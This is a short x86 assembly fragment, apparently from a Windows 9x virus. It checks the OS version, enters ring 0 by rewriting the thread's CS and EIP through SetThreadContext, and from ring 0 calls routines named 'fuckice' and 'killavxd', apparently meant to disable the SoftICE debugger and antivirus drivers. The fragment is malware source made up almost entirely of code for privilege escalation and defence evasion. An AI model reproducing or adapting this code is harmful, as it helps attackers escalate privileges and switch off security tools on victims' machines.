
; output: ESI=curr. version
is_winNT:               call    xxGetVersion
                        xchg    esi, eax
                        test    esi, 80000000h
                        ret

; method #2: entering ring-0 (SetThreadContext)

callring0_2:            pusha

                        call    is_winNT            ; if only win9X
                        jz      __exit              ; winNT

                        seh_init

                        mov     save_esp, esp
                        sub     esp, 1024+0C8h
                        push    -1

                        call    xxGetCurrentThread
                        xchg    ebx, eax

                        push    esp
                        push    ebx
                        call    xxGetThreadContext
                        or      eax, eax
                        jz      __error

                        push    28h
                        pop     eax
                        xchg    eax, [esp+0BCh]
                        mov     save_cs, eax

                        pusho   r0proc_2
                        pop     eax
                        xchg    eax, [esp+0B8h]
                        mov     save_eip, eax

                        push    esp
                        push    ebx
                        call    xxSetThreadContext

__error:                add     esp, 1024+0CCh

                        seh_done

__exit:                 popa
                        ret

r0proc_2:               xchg    esp, ss:save_esp

                        pushf
                        call    r0_call_handler
                        popf

                        mov     esp, ss:save_esp

                        pushf
                        push    ss:save_cs
                        push    ss:save_eip
                        iret

r0_call_handler:        pusha
                        push    ds es

                        push    ss ss
                        pop     ds es

                        call    ring0handler

                        pop     es ds
                        popa
                        ret

ring0handler:           pusha

                        call    fuckice
                        call    killavxd

                        popa
                        ret
